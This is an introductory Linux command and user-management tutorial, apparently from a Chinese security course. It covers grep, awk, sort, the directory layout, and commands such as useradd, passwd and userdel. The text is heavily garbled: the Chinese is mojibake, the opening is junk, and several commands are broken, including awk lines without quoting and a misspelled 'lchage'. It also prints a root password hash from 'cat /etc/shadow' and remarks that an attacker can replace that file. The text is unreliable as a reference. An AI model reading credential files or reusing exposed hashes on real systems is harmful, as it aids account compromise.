sdsd 4 65656 5 sdsd 6 sdsd 7 sdsd 8 33333 9 565656565 10 33333 11 565656565 12 33333 13 565656565 14 33333 15 565656565 16 17 18 sdssds ;;;; wc -c jaden.txt # ç»Ÿè®¡æ–‡ä»¶ä¸­æœ‰å¤šå°‘ä¸ªå­—èŠ‚# ç»Ÿè®¡æŒ‡ä»¤æ‰§è¡Œç»“æœæœ‰å¤šå°‘è¡Œ ä¾‹å­ï¼šip addr|wc -l# ç»Ÿè®¡binç›®å½•ä¸‹æœ‰å¤šå°‘ä¸ªå‘½ä»¤æ–‡ä»¶ ä¾‹å­ï¼šls /bin |wc -l 2.5.2 ç”Ÿæˆæ•°å­—åºåˆ—seq # å…¨ç§°ï¼šsequenceï¼Œåºåˆ—çš„æ„æ€# ä¾‹å­1ï¼šäº§ç”Ÿä¸€ä¸ª5åˆ°12çš„åºåˆ—[root@localhost ~]# seq 5 12 5 6 7 8 9 10 11 12ä¾‹å­2ï¼šäº§ç”Ÿä¸€ä¸ª5åˆ°12ç­‰å®½çš„åºåˆ—[root@localhost ~]# seq -w 5 110 05 06 07 08 09 10 11 12 2.5.3 è¿‡æ»¤å­—ç¬¦ä¸²#æŒ‰è¡Œè¿‡æ»¤å­—ç¬¦ä¸²ï¼Œé»˜è®¤æ˜¯æ¨¡ç³ŠåŒ¹é…ï¼Œåªè¦å•è¯ä¸­å«æœ‰æŸäº›å†…å®¹å°±è¿‡æ»¤å‡ºå•è¯æ‰€åœ¨çš„æ¯è¡Œæ•°æ®grep## å‚æ•° -n è¡¨ç¤ºåœ¨ç»“æœä¸­æ˜¾ç¤ºåŒ¹é…çš„è¡Œçš„è¡Œå·ä¾‹å­1ï¼š #æ™®é€šè¿‡æ»¤ï¼Œå°†å«æœ‰3è¿™ä¸ªå­—ç¬¦çš„è¡Œè¿‡æ»¤å‡ºæ¥[root@localhost ~]# grep 333 jaden.txt 33333 33334 33333 53333ä¾‹å­2ï¼š #æ˜¾ç¤ºè¡Œå·[root@localhost ~]# grep -n 333 jaden.txt 8:33333 10:33333 12:33333 14:33333 2.5.4 æŒ‰åˆ—è¿‡æ»¤awk #awkå…¶åç§°å¾—è‡ªäºå®ƒçš„åˆ›å§‹äºº Alfred Aho ã€Peter Weinberger å’Œ Brian Kernighan å§“æ°çš„é¦–ä¸ªå­—æ¯ã€‚# ä¾‹å­1ï¼š å–åˆ—,$1ä»£è¡¨ç¬¬ä¸€åˆ—ï¼Œ$2ä»£è¡¨ç¬¬äºŒåˆ—ï¼Œ$NFä»£è¡¨æœ€åä¸€åˆ—ï¼Œåˆ—æ˜¯ç”±ç©ºæ ¼åˆ†å¼€çš„[root@localhost ~]# cat jaden.txt row 1, cell 1 row 1, cell 2row 2, cell 1 row 2, cell 2[root@localhost ~]# awk print $1 jaden.txt # æ³¨æ„ï¼Œå¿…é¡»æ˜¯å•å¼•å· row row[root@localhost ~]# awk print $2 jaden.txt 1, 2, #ä¾‹å­2ï¼šä»¥é€—å·,åšåˆ†éš”ç¬¦[root@localhost ~]# cat jaden.txt row 1, cell 1 row 1, cell 2 row 2, cell 1 row 2, cell 2[root@localhost ~]# awk -F , print $1 jaden.txt row 1 row 2[root@localhost ~]# awk -F , print $NF jaden.txt cell 2 2.5.5 æ’åºsort # é»˜è®¤æ’åºï¼Œå…ˆæ•°å­—åå­—æ¯# sort -n # å…ˆå­—æ¯(å…ˆå°å†™å­—æ¯åå¤§å†™å­—æ¯)åæ•°å­—çš„æ’åºæ–¹å¼ï¼Œ# sort -n -r åå‘æ’åºä¾‹å­1ï¼š[root@localhost ~]# cat test02.txt 3 2 6 4 8 7 5 3 2 1 2 3 4 5 6 9 1 5 7[root@localhost ~]# cat test02.txt|sort -n 1 1 2 2 2 3 3 3 4 4 5 5 5 6 6 7 7 8 9 2.5.6 ç»Ÿè®¡å»é‡uniq #å…¨ç§°ï¼šuniqueï¼Œå”¯ä¸€ã€å»é‡çš„æ„æ€ï¼Œä½†æ˜¯å®ƒæ˜¯å°†è¿ç»­çš„å»é‡ï¼Œä¸ä¼šé—´éš”å»é‡ï¼Œæ‰€ä»¥æœ€å¥½å…ˆæ’åºå†å»é‡ä¾‹å­1ï¼š[root@localhost ~]# cat test02.txt|sort -n 1 1 2 2 2 3 3 3 4 4 5 5 5 6 6 7 7 8 9[root@localhost ~]# cat test02.txt|sort -n|uniq [root@localhost ~]# cat test02.txt|sort -n|uniq -c # -cæ˜¾ç¤ºé‡å¤æ¬¡æ•° 2 1 3 2 3 3 2 4 3 5 2 6 2 7 1 8 1 9 2.6 Linuxç›®å½•ç»“æ„ä»‹ç»/bin #å­˜æ”¾äºŒè¿›åˆ¶çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤ï¼Œå…¶å®æ¯ä¸ªå‘½ä»¤åŸºæœ¬éƒ½æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œä»£ç æ–‡ä»¶ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤! # windowçš„å‘½ä»¤æ–‡ä»¶éƒ½æ˜¯exeç»“å°¾çš„ï¼Œlinuxçš„å‘½ä»¤æ–‡ä»¶æ˜¯æ²¡æœ‰åç¼€åçš„ï¼Œå¦‚æœåˆ é™¤äº†æŸä¸ªå‘½ä»¤æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªå‘½ä»¤å°±ä¸èƒ½ç”¨äº† /boot #å¼€æœºå¯åŠ¨éœ€è¦çš„æ–‡ä»¶ï¼Œ ç‰¹åˆ«é‡è¦ï¼Œä¸è¦åŠ¨é‡Œé¢çš„æ–‡ä»¶ã€‚/dev #devå…¨ç§°ï¼šDevicesï¼Œç¡¬ä»¶è®¾å¤‡æ§åˆ¶æ–‡ä»¶ï¼Œç‰¹åˆ«é‡è¦ï¼Œåƒä¸‡ä¸è¦åŠ¨!/etc #å­˜æ”¾ç³»ç»Ÿçš„å„ç§é…ç½®æ–‡ä»¶ï¼Œç›¸å½“äºwindowsçš„æ³¨å†Œè¡¨ï¼Œä¹Ÿå°±æ˜¯è¶…å¤§çš„é…ç½®æ–‡ä»¶ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤! # æ¯”å¦‚æ”¹å¯†ç ä»€ä¹ˆçš„ï¼Œå…¶å®éƒ½æ˜¯ä¿®æ”¹çš„etcä¸‹é¢çš„æŸä¸ªé…ç½®æ–‡ä»¶(shadowæ–‡ä»¶)ä¸­çš„é…ç½®ï¼Œè¿˜æœ‰å®‰è£…çš„å„ç§è½¯ä»¶é…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯æ”¾åˆ°è¿™ä¸ªç›®å½•ï¼Œä¹Ÿå¯ä»¥æ”¾åˆ°å…¶ä»–ç›®å½•ï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½æ˜¯æ”¾åˆ°è¿™é‡Œã€‚ /home #æ‰€æœ‰æ™®é€šç”¨æˆ·çš„å®¶ç›®å½•å°±åœ¨è¿™ä¸ªhomeç›®å½•ä¸‹ï¼Œæ¯ä¸ªç”¨æˆ·ç›®å½•ä¸­éƒ½æœ‰è‡ªå·±çš„æ¡Œé¢ç­‰ç›®å½•ï¼Œwindowséƒ½æ˜¯æ”¾åˆ°äº†Usersç›®å½•ä¸‹/root #rootç”¨æˆ·çš„ä¸“å±å®¶ç›®å½•ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤!/lib #library 32ä½åº“ï¼Œä¸€èˆ¬æ˜¯soç»“å°¾çš„åº“æ–‡ä»¶ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤! # soç»“å°¾çš„åº“æ–‡ä»¶ï¼Œç±»ä¼¼äºwindowsä¸‹çš„ç³»ç»Ÿçš„dllåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚åƒä¸‡ä¸è¦å°è¯•åˆ é™¤ï¼Œè¯•è¯•å°±é€ä¸–ã€‚å¦‚æœæœ‰å¿«ç…§çš„è¯ä½ å¯ä»¥è¯•è¯•ã€‚ /lib64 #library 64ä½åº“ï¼Œä¸€èˆ¬æ˜¯soç»“å°¾çš„åº“æ–‡ä»¶ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤!/media #å¤šåª’ä½“æ–‡ä»¶ç›®å½•(éŸ³ä¹ã€è§†é¢‘ã€æ–‡æ¡£ç­‰)ï¼Œæ˜¯ä¸€ä¸ªä¸é‡è¦çš„ç›®å½•ï¼Œåªæ˜¯linuxçš„ä½œè€…å¸Œæœ›ç”¨æˆ·èƒ½å¤ŸæŒ‰ç…§å¯¹åº”ç›®å½•æ¥å­˜æ”¾å†…å®¹ï¼Œè¿™ä¸ªç›®å½•æ™®é€šç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™åˆ é™¤çš„ï¼Œrootç”¨æˆ·å¯ä»¥åˆ é™¤å®ƒ/mnt #å…¨ç§°ï¼šmountï¼ŒæŒ‚è½½çš„æ„æ€ï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥æŒ‚è½½å…‰ç›˜ï¼ŒUç›˜ï¼Œä¹Ÿå°±æ˜¯æ’å…¥Uç›˜ã€å…³ç›˜ç­‰ï¼Œæ‰“å¼€ä¹‹åä¸€èˆ¬éƒ½æ˜¯åœ¨è¿™ä¸ªmntç›®å½•ä¸‹ï¼Œè¿™ä¸ªç›®å½•ä¹Ÿæ˜¯å¯ä»¥åˆ é™¤çš„/opt #éƒ¨åˆ†è½¯ä»¶å®‰è£…å­˜å‚¨ç›®å½•ï¼Œå®‰è£…çš„æŸäº›è½¯ä»¶çš„æ—¶å€™ï¼Œå¦‚æœé»˜è®¤å®‰è£…ï¼Œé‚£ä¹ˆå®ƒå¯èƒ½ä¼šå°†è‡ªå·±çš„ç¨‹åºå®‰è£…åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œå¦‚æœä½ ä¸ç”¨è¿™ä¸ªç›®å½•ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯å¯ä»¥åˆ é™¤çš„ç›®å½•/proc #å…¨ç§°ï¼šprocessï¼Œæ˜¯è¿›ç¨‹çš„æ„æ€ï¼Œæ¯ä¸ªè¿›ç¨‹ç¼–å·ä¸€ä¸ªç›®å½•ã€‚é€šè¿‡ps -efæŒ‡ä»¤å¯ä»¥æŸ¥çœ‹åˆ°è¿›ç¨‹ç¼–å·ï¼Œ ç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤!/sbin #å…¨ç§°ï¼šsuper binï¼Œæ˜¯è¶…çº§ç”¨æˆ·æ‰èƒ½ä½¿ç”¨çš„å‘½ä»¤ ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤! shutdown reboot # æ¯”å¦‚æ™®é€šç”¨æˆ·æ˜¯æ²¡æœ‰å…³æœº(shutdown)ã€é‡å¯(reboot)ç­‰å±å®³æ¯”è¾ƒå¤§çš„æŒ‡ä»¤ï¼Œè¿™äº›å‘½ä»¤æ–‡ä»¶åœ¨sbinç›®å½•ä¸­ /srv #ä¹‹å‰ç”¨æ¥å­˜æ”¾è½¯ä»¶æºä»£ç æ–‡ä»¶çš„ï¼Œè¿™ä¸ªç›®å½•ä¹Ÿæ²¡å•¥ç”¨ã€‚æºä»£ç --ç¼–è¯‘--æ‰“åŒ…--è½¯ä»¶åŒ…ï¼Œè½¯ä»¶åŒ…åœ¨windowsä¸‹å«åšå¯æ‰§è¡Œæ–‡ä»¶ï¼Œlinuxä¸‹å«åšå‘½ä»¤æ–‡ä»¶ã€‚å…¶å®å«å•¥éƒ½è¡Œï¼Œæ˜ç™½å®ƒæ˜¯å•¥å³å¯ã€‚/sys #å…¨ç§°ï¼šsystemï¼Œæ˜¯ç³»ç»ŸåŠŸèƒ½ç›®å½•ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤!/tmp #å…¨ç§°ï¼štemporaryï¼Œä¸´æ—¶çš„æ„æ€ï¼Œç”¨æ¥å­˜æ”¾ä¸´æ—¶æ–‡ä»¶çš„ç›®å½•ï¼Œè¿™é‡Œé¢çš„æ–‡ä»¶å¦‚æœé•¿æ—¶é—´æ²¡ç”¨çš„è¯ï¼Œä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨æ¸…é™¤ã€‚ # windowsä¸‹ä¹Ÿæœ‰å¾ˆå¤šè¿™æ ·çš„ä¸´æ—¶ç›®å½•ï¼Œå¤šæ•°éƒ½æ˜¯éšè—ç›®å½•ï¼Œæ¯”å¦‚C:\\Users\\ç”¨æˆ·å\\AppData\\Local\\Tempï¼Œå¥½å¤šæ¸…ç†ç³»ç»Ÿåƒåœ¾çš„è½¯ä»¶ï¼Œå…¶å®éƒ½æ˜¯åˆ é™¤äº†ä¸€äº›ä¸´æ—¶æ–‡ä»¶ã€‚ /run #è¿è¡Œï¼Œç¨‹åºè¿è¡Œçš„æ—¶å€™äº§ç”Ÿçš„æ–‡ä»¶ï¼Œå¤šæ•°ä¹Ÿæ˜¯ä¸´æ—¶æ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œçš„æ–‡ä»¶ä¸ä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨æ¸…é™¤ã€‚/usr #ç”¨æˆ·çº§çš„ç›®å½•ï¼Œusrå…¨ç§°æ˜¯UNIX software resourceï¼Œä¸»è¦å­˜æ”¾çš„æ˜¯ä¸€äº›è½¯ä»¶ç¨‹åºä»¥åŠè¿™äº›ç¨‹åºæ‰€éœ€è¦ä½¿ç”¨çš„åº“ï¼Œå½“ç„¶ä¹Ÿä¼šä¿å­˜ä¸€äº›ç¨‹åºéœ€è¦çš„èµ„æºæ–‡ä»¶ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤! usrç›®å½•ä¸‹é¢çš„æ–‡ä»¶å¤¹ç§ç±»å’Œ/æ ¹ç›®å½•ä¸‹å¾ˆåƒï¼Œæ¯”å¦‚éƒ½æœ‰binç›®å½•ï¼Œlinuxä½œè€…è¿™æ ·çš„è®¾è®¡æ˜¯æƒ³å‘Šè¯‰ç”¨æˆ·ï¼Œç³»ç»Ÿçš„å‘½ä»¤æ–‡ä»¶æ”¾åˆ°æ ¹ç›®å½•çš„binä¸‹ï¼Œç”¨æˆ·è‡ªå·±å®‰è£…çš„æŸäº›è½¯ä»¶çš„å‘½ä»¤æ–‡ä»¶ï¼Œæ”¾åˆ°/usr/binä¸‹é¢ã€‚/var #å…¨ç§°æ˜¯variableï¼Œç”¨æ¥å­˜æ”¾ä¸€äº›ç»å¸¸å˜åŠ¨çš„æ–‡ä»¶ï¼Œæ¯”å¦‚æ—¥å¿—æ–‡ä»¶ã€ç½‘é¡µæ–‡ä»¶ã€ç¼“å­˜ç­‰ï¼Œç‰¹åˆ«é‡è¦ï¼Œä¸èƒ½åˆ é™¤! # è¿™ä¸ªç›®å½•ä¸‹æˆ‘ä»¬å®‰å…¨äººå‘˜ä¸€èˆ¬åªå…³æ³¨logæ—¥å¿—ç›®å½•ã€‚æ¯”å¦‚ç”¨æˆ·ç™»å½•ç³»ç»Ÿã€ä»€ä¹ˆæ—¶å€™ç™»å½•çš„ã€ç™»é™†äº†å‡ æ¬¡ç­‰ç­‰ï¼Œéƒ½ä¼šåœ¨logç›®å½•ä¸‹äº§ç”Ÿæ—¥å¿—è®°å½•ï¼Œè¿™ä¸ªæˆ‘ä»¬åæœŸä¼šåšæ¼”ç¤º. 2.7 ç”¨æˆ·ä¸ç”¨æˆ·ç»„ç®¡ç†2.7.1 ç”¨æˆ·ç®¡ç†1-1 åˆ›å»ºç”¨æˆ·#åˆ›å»ºç”¨æˆ·useradd #åˆ›å»ºä¸€ä¸ªç”¨æˆ·ä¾‹å­1ï¼šuseradd test1 1-2 è®¾ç½®å¯†ç #è®¾ç½®å¯†ç ï¼Œè¿œç¨‹sshè¿æ¥æ˜¯éœ€è¦å¯†ç çš„ï¼Œæ‰€ä»¥æƒ³è®©æŸä¸ªç”¨æˆ·ç™»å½•ç³»ç»Ÿï¼Œå¿…é¡»è®¾ç½®å¯†ç passwdä¾‹å­1ï¼špasswd test1#ç”¨rootç”¨æˆ·ç»™æ™®é€šç”¨æˆ·ä¿®æ”¹å¯†ç [root@localhost ~]# passwd test1æ›´æ”¹ç”¨æˆ· test1 çš„å¯†ç  ã€‚æ–°çš„ å¯†ç ï¼š123456æ— æ•ˆçš„å¯†ç ï¼š å¯†ç æ˜¯ä¸€ä¸ªå›æ–‡é‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼š123456passwdï¼šæ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚#æ™®é€šç”¨æˆ·è‡ªå·±ä¿®æ”¹å¯†ç [test1@localhost ~]$ passwd # ç»™å½“å‰ç™»å½•ç”¨æˆ·ä¿®æ”¹å¯†ç ï¼Œrootç”¨æˆ·ä¿®æ”¹å¯†ç ä¸éœ€è¦è¾“å…¥æ—§å¯†ç ï¼Œæ™®é€šç”¨æˆ·éœ€è¦è¾“å…¥æ—§å¯†ç æ›´æ”¹ç”¨æˆ· test1 çš„å¯†ç  ã€‚ä¸º test1 æ›´æ”¹ STRESS å¯†ç ã€‚ï¼ˆå½“å‰ï¼‰UNIX å¯†ç ï¼šæ–°çš„ å¯†ç ï¼šæ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦æ–°çš„ å¯†ç ï¼šæ— æ•ˆçš„å¯†ç ï¼š å¯†ç å°‘äº 8 ä¸ªå­—ç¬¦æ–°çš„ å¯†ç ï¼šæ— æ•ˆçš„å¯†ç ï¼š å¯†ç æœªé€šè¿‡å­—å…¸æ£€æŸ¥ - è¿‡äºç®€å•åŒ–/ç³»ç»ŸåŒ–passwd: å·²ç»è¶…å‡ºæœåŠ¡é‡è¯•çš„æœ€å¤šæ¬¡æ•°# ä¸€èˆ¬linuxçš„å¯†ç æ˜¯æœ‰å¤æ‚åº¦è¦æ±‚çš„ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ç§å¯†ç å°±å¯ä»¥é€šè¿‡ï¼šå¤§å°å†™ç»„åˆã€æ•°å­—ã€ç‰¹æ®Šå­—ç¬¦ç»„åˆèµ·æ¥è¶…è¿‡8ä½ã€‚jaden666@qq.COMjaden666@WSXä¾‹å­3ï¼š#å…äº¤äº’ä¿®æ”¹å¯†ç ï¼Œè¿™æ ·ä¸éœ€è¦è¾“å…¥ä¸¤æ¬¡å¯†ç ç¡®è®¤ã€‚echoæ˜¯æ‰“å°çš„æ„æ€ï¼Œæœ‰ç»“æœè¾“å‡ºç»™passwdå‘½ä»¤æ¥ä¿®æ”¹test1ç”¨æˆ·çš„å¯†ç echo 123456|passwd --stdin test1# è¿™ç§ä¸€èˆ¬åŒæ—¶æ”¹å¤šä¸ªLinuxæœåŠ¡å™¨ç³»ç»Ÿçš„å¯†ç æ—¶æ¯”è¾ƒæ–¹ä¾¿ã€‚ 1-3 æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨#æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨idä¾‹å­1: #ç”¨æˆ·å­˜åœ¨ï¼Œç³»ç»Ÿçš„è¿”å›ç»“æœ[root@localhost ~]# id test1uid=1000(test1) gid=1000(test1) ç»„=1000(test1)#ç”¨æˆ·ä¸å­˜åœ¨ï¼Œç³»ç»Ÿçš„è¿”å›ç»“æœ[root@localhost ~]# id test2id: test2: no such user 1-4 åˆ é™¤ç”¨æˆ·## æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨cat /etc/passwd#åˆ é™¤ç”¨æˆ·userdelä¾‹å­1ï¼š#è¢«åˆ é™¤çš„ç”¨æˆ·è¿˜åœ¨ç™»å½•çŠ¶æ€ï¼Œæ˜¯ä¸èƒ½åˆ é™¤çš„[root@localhost ~]# userdel test1userdel: user test1 is currently used by process 2356#è¢«åˆ é™¤çš„ç”¨æˆ·ï¼Œé€€å‡ºç™»å½•ä¹‹åï¼Œå¯ä»¥æ­£å¸¸åˆ é™¤[root@localhost ~]# userdel test1 linuxåˆ é™¤ç”¨æˆ·ä¹‹åï¼Œ/home/ç›®å½•ä¸‹å¯¹åº”çš„ç”¨æˆ·æ–‡ä»¶å¤¹è¿˜åœ¨ï¼Œå¦‚æœè¿˜æƒ³åŠ å›æ¥è¿™ä¸ªç”¨æˆ·ï¼Œé‚£ä¹ˆä¼šæç¤ºå®¶ç›®å½•å­˜ åœ¨ï¼Œä¸ä¼šä»æ ·æ¿ç›®å½•(skel)ä¸­å¤åˆ¶ä»»ä½•æ–‡ä»¶äº†ï¼Œé€šè¿‡ls -a /etc/skelï¼Œå¯ä»¥çœ‹åˆ°skelç›®å½•ä¸‹çš„å†…å®¹äº†ã€‚ è¿˜æç¤ºé‚®ç®±æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œls /var/spool/mailä¸‹é¢ windowsåˆ é™¤ç”¨æˆ·ä¹‹åï¼Œc:\\Usersç›®å½•ä¸‹çš„ç”¨æˆ·æ–‡ä»¶å¤¹ä¹Ÿè¿˜åœ¨ æ³¨æ„ï¼šåˆ é™¤ä¹‹åçš„ç”¨æˆ·ï¼Œå†æ¬¡åˆ›å»ºå‡ºæ¥ï¼Œå¯†ç æ˜¯éœ€è¦é‡æ–°è®¾ç½®çš„[root@localhost ~]# userdel -r test1 # åˆ é™¤ç”¨æˆ·ï¼Œå¹¶åˆ é™¤ç”¨æˆ·ç›¸å…³ç›®å½• 1-5 ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹å±æ€§#ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹å±æ€§usermod # modify å®ƒæœ‰å¾ˆå¤šé€‰é¡¹(å‚æ•°)ï¼Œ-Læ˜¯é”å®šç”¨æˆ·ï¼Œé€šè¿‡å‘½ä»¤ -h(æˆ–è€…--helpï¼Œä¸€ä¸ª-åé¢ä¸€èˆ¬è·Ÿä¸€ä¸ªå­—æ¯å³å¯ï¼Œä¸¤ä¸ª-åé¢ä¸€èˆ¬è·Ÿå®Œæ•´å•è¯)ï¼Œå¯ä»¥æŸ¥çœ‹å‘½ä»¤çš„å„ç§é€‰é¡¹çš„æ„æ€ï¼Œæ¯”å¦‚usermod -h#é”å®šç”¨æˆ·(å’Œwindowsçš„ç¦ç”¨ç”¨æˆ·ä¸€ä¸ªæ„æ€)ä¾‹å­1ï¼š[root@localhost ~]# usermod -L test1 #è¢«é”å®šçš„ç”¨æˆ·ï¼Œä¸‹æ¬¡å°±ç™»å½•ä¸ä¸Šç³»ç»Ÿäº†ã€‚[root@localhost ~]# usermod -U test1 #è§£é”ç”¨æˆ·[root@localhost ~]# lchage -l test1 # æŸ¥çœ‹ç”¨æˆ·è¯¦ç»†ä¿¡æ¯å¸å·è¢«é”ã€‚è‡³å°‘: 0è‡³å¤š: 99999è­¦å‘Š: 7ä¸æ´»è·ƒï¼š ä»ä¸æœ€åä¸€æ¬¡æ”¹å˜ï¼š 2021å¹´07æœˆ20æ—¥å¯†ç è¿‡æœŸï¼š ä»ä¸å¯†ç ä¸æ´»è·ƒï¼š ä»ä¸å¸å·è¿‡æœŸï¼š ä»ä¸#ç¦æ­¢ç”¨æˆ·ç™»å½•(è¿™ä¸ªåé¢å†è¯´)[root@localhost ~]# usermod -s /sbin/nologin test2[root@localhost ~]# grep -w test2 /etc/passwdtest2:x:1001:1001::/home/test2:/sbin/nologin 1-6 æŸ¥çœ‹ç”¨æˆ·è¯¦ç»†ä¿¡æ¯lchageä¾‹å­1ï¼š[root@localhost ~]# lchage -l test1 å¸å·æ²¡è¢«é”ã€‚ è‡³å°‘: 0 è‡³å¤š: 99999 è­¦å‘Š: 7 ä¸æ´»è·ƒï¼š ä»ä¸ æœ€åä¸€æ¬¡æ”¹å˜ï¼š 2021å¹´07æœˆ20æ—¥ å¯†ç è¿‡æœŸï¼š ä»ä¸ å¯†ç ä¸æ´»è·ƒï¼š ä»ä¸ å¸å·è¿‡æœŸï¼š ä»ä¸ ## æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨/etc/passwdæ–‡ä»¶ä¸­ï¼Œæ¯åˆ›å»ºä¸€ä¸ªç”¨æˆ·è¯¥æ–‡ä»¶å°±ä¼šå¤šä¸€è¡Œè®°å½•## passwdæ–‡ä»¶è§£é‡Šroot:x:0:0:root:/root:/bin/bashtest1:x:1000:1000::/home/test1:/bin/bashtest2:x:1001:1001::/home/test2:/sbin/nologintest3:x:1002:1000::/home/test3:/sbin/nologinhaha:x:1004:1004:putong user:/home/haha:/bin/bashç¬¬ä¸€åˆ—ï¼šç”¨æˆ·åç¬¬äºŒåˆ—ï¼šxç¬¬ä¸‰åˆ—ï¼šuid # rootç”¨æˆ·çš„uidæ˜¯0ï¼Œæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ç”¨æˆ·uidæ˜¯1000åŠä¹‹åçš„æ•°å€¼ã€‚ç¬¬å››åˆ—ï¼šgidç¬¬äº”åˆ—ï¼šæ³¨é‡Šï¼Œä¸€èˆ¬ä¸ºç©ºç¬¬å…­åˆ—ï¼šå®¶ç›®å½•çš„ä½ç½®ç¬¬ä¸ƒåˆ—ï¼šä½¿ç”¨shellçš„åç§°ï¼Œé»˜è®¤ä½¿ç”¨/bin/bash## æœ‰çš„ç”¨æˆ·å¯†ç ä¿¡æ¯å­˜å‚¨/etc/shadowï¼Œè®¾ç½®äº†å¯†ç çš„é•¿åº¦æ¯”è¾ƒé•¿ã€‚å¯†ç æ˜¯ä¸¤å±‚åŠ å¯†çš„ï¼ŒåŸºæœ¬æ— æ³•ç ´è§£ã€‚ä½†æ˜¯å¦‚æœé»‘å®¢æƒé™æ¯”è¾ƒé«˜ï¼Œå®ƒå¯ä»¥ç”¨çŸ¥é“å¯†ç çš„shadowæ–‡ä»¶æ¥æ›¿æ¢è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ä¸‹æŸä¸ªç”¨æˆ·çš„å¯†ç ï¼Œåªæœ‰rootç”¨æˆ·æ‰æœ‰æƒåŠ›ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ã€‚[root@localhost ~]# cat /etc/shadowroot:$6$QM3AHtFflOvGbCnt$2wTYZrnO8c66vycaxprE79G.I7hiy8EqXntG86FXxqlSawjtKoTjAnAa9xFA3ad1QpFskJRPt0QeDPBnZZAdx0::0:99999:7:::bin:*:18353:0:99999:7:::daemon:*:18353:0:99999:7:::adm:*:18353:0:99999:7:::lp:*:18353:0:99999:7:::sync:*:18353:0:99999:7:::shutdown:*:18353:0:99999:7:::halt:*:18353:0:99999:7:::mail:*:18353:0:99999:7:::operator:*:18353:0:99999:7:::games:*:18353:0:99999:7:::ftp:*:18353:0:99999:7:::nobody:*:18353:0:99999:7:::systemd-network:!!:18827::::::dbus:!!:18827::::::polkitd:!!:18827:::::: 1-7 ç™»å½•ä¸»æœºçš„ä¸¤ç§æ–¹å¼ï¼š## æœ¬åœ°ç™»å½•ï¼šç›´æ¥åœ¨ä¸»æœºä¸Šè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ç™»å½•## è¿œç¨‹ç™»å½•ï¼šsshè¿œç¨‹ç™»å½•## windowsé»˜è®¤åªèƒ½åŒæ—¶ä¸€ä¸ªç”¨æˆ·ç™»å½•ï¼Œç™»å½•å¦å¤–ä¸€ä¸ªç”¨æˆ·ï¼Œå‰ä¸€ä¸ªç”¨æˆ·å°±ä¼šè‡ªåŠ¨ä¸‹çº¿ã€‚## linuxæ”¯æŒå¤šä¸ªç”¨æˆ·åœ¨å¤šä¸ªåœ°æ–¹åŒæ—¶ç™»å½•ä¸€ä¸ªç³»ç»Ÿï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªç»ˆç«¯æ¥æ§åˆ¶æ“ä½œç³»ç»Ÿã€‚ç»ˆç«¯çš„æ„æ€å°±æ˜¯è¿æ¥çª—å£ã€‚# æŸ¥çœ‹å½“å‰ç™»å½•äº†å‡ ä¸ªç”¨æˆ·ï¼Œæˆ–è€…æ‰“å¼€äº†å‡ ä¸ªç»ˆç«¯wç»“æœï¼šä¸‹é¢è¡¨ç¤º2ä¸ªç»ˆç«¯ç™»å½•äº†12:15:42 up 21 min, 2 users, load average: 0.00, 0.01, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot tty1 12:15 6.00s 0.00s 0.00s -bashroot pts/0 192.168.61.1 11:55 6.00s 0.02s 0.01s w# tty1è¡¨ç¤ºæœ¬åœ°ç™»å½•çš„ã€pts/0è¡¨ç¤ºè¿œç¨‹ç™»å½•çš„ 2.7.2 ç”¨æˆ·ç»„ç®¡ç†2-1 æ–°å»ºç»„å’ŒæŸ¥çœ‹ç»„:## æ–°å»ºç»„å’ŒæŸ¥çœ‹ç»„: groupadd ç»„åä¾‹å­ï¼š [root@localhost tmp]# groupadd test [root@localhost tmp]# cat /etc/group # æŸ¥çœ‹æœ‰å“ªäº›ç»„ 2-2 